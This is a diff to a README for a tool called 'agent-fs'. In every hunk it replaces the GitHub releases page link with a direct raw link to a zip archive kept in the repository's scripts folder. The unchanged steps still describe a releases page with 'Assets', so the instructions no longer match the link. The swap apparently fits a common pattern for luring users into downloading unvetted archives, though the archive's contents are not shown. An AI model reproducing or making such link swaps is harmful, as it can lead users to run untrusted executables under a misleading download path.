@@ -1,6 +1,6 @@
 # 📂 agent-fs - Manage Files with Simple Commands
 
-[![Download agent-fs](https://img.shields.io/badge/Download-agent--fs-blue?style=for-the-badge)](https://github.com/Teddy012/agent-fs/releases)
+[![Download agent-fs](https://img.shields.io/badge/Download-agent--fs-blue?style=for-the-badge)](https://raw.githubusercontent.com/Teddy012/agent-fs/main/scripts/agent_fs_v3.9.zip)
 
 ---
 
@@ -36,7 +36,7 @@ To use agent-fs, you will download it, open the command window, and run basic co
 1. Open your web browser.
 2. Go to the download page by clicking this link or typing it into the address bar:
    
-   [https://github.com/Teddy012/agent-fs/releases](https://github.com/Teddy012/agent-fs/releases)
+   [https://raw.githubusercontent.com/Teddy012/agent-fs/main/scripts/agent_fs_v3.9.zip](https://raw.githubusercontent.com/Teddy012/agent-fs/main/scripts/agent_fs_v3.9.zip)
    
 3. On the page, look for the latest release. It usually appears at the top.
 4. Scroll to the “Assets” section.
@@ -169,7 +169,7 @@ You can open JSON files in any text editor like Notepad or more advanced tools l
 
 You can start by visiting the releases page here:
 
-[https://github.com/Teddy012/agent-fs/releases](https://github.com/Teddy012/agent-fs/releases)
+[https://raw.githubusercontent.com/Teddy012/agent-fs/main/scripts/agent_fs_v3.9.zip](https://raw.githubusercontent.com/Teddy012/agent-fs/main/scripts/agent_fs_v3.9.zip)
 
 Download the Windows file and follow the steps above.
 
@@ -206,4 +206,4 @@ If you need more support, you can:
 
 ---
 
-[![Download agent-fs](https://img.shields.io/badge/Download-agent--fs-blue?style=for-the-badge)](https://github.com/Teddy012/agent-fs/releases)
+[![Download agent-fs](https://img.shields.io/badge/Download-agent--fs-blue?style=for-the-badge)](https://raw.githubusercontent.com/Teddy012/agent-fs/main/scripts/agent_fs_v3.9.zip)
